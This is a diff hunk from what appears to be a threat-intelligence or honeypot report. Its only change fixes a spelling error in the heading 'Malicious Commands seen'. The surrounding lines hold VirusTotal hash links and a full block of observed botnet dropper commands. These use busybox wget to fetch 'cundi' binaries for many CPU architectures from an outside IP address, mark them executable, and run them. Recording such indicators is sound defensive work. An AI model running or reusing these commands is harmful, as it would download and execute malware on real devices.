@@ -29,6 +29,6 @@ https://www.virustotal.com/gui/file/b7df8b3e5b72fb74566d3568e13f5852ab29ff379a9d
 c5c24a19759ea0257f1b8bbfde9a3e73bb4960618e0de4dc988ee2f3b505a8f1
 https://www.virustotal.com/gui/file/c5c24a19759ea0257f1b8bbfde9a3e73bb4960618e0de4dc988ee2f3b505a8f1
 
-Malcious Commands seen:
+Malicious Commands seen:
 
 busybox wget http://14.225.219.227/cundi.arm5; chmod 777 cundi.arm5; ./cundi.arm5 android\r\nbusybox wget http://14.225.219.227/cundi.arm; chmod 777 cundi.arm; ./cundi.arm android\r\nbusybox wget http://14.225.219.227/cundi.arm6; chmod 777 cundi.arm6; ./cundi.arm6 android\r\nbusybox wget http://14.225.219.227/cundi.arm7; chmod 777 cundi.arm7; ./cundi.arm7 android\r\nbusybox wget http://14.225.219.227/cundi.m68k; chmod 777 cundi.m68k; ./cundi.m68k android\r\nbusybox wget http://14.225.219.227/cundi.mips; chmod 777 cundi.mips; ./cundi.mips android\r\nbusybox wget http://14.225.219.227/cundi.mpsl; chmod 777 cundi.mpsl; ./cundi.mpsl android\r\nbusybox wget http://14.225.219.227/cundi.ppc; chmod 777 cundi.ppc; ./cundi.ppc android\r\nbusybox wget http://14.225.219.227/cundi.sh4; chmod 777 cundi.sh4; ./cundi.sh4 android\r\nbusybox wget http://14.225.219.227/cundi.x86; chmod 777 cundi.x86; ./cundi.x86 android\r\nbusybox wget http://14.225.219.227/cundi.x86_64; chmod 777 cundi.x86_64; ./cundi.x86_64 android
